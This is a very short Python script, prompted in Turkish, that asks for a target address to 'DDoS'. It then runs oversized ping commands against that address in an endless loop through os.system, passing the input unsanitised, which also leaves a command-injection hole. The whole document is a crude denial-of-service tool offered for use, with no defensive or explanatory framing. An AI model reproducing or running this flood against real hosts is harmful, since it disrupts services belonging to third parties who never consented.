import os 

adress = input(("Ddos atmak istediğiniz adresi girin?\n"))
while True:
    os.system("ping -s 9232   %s" % adress)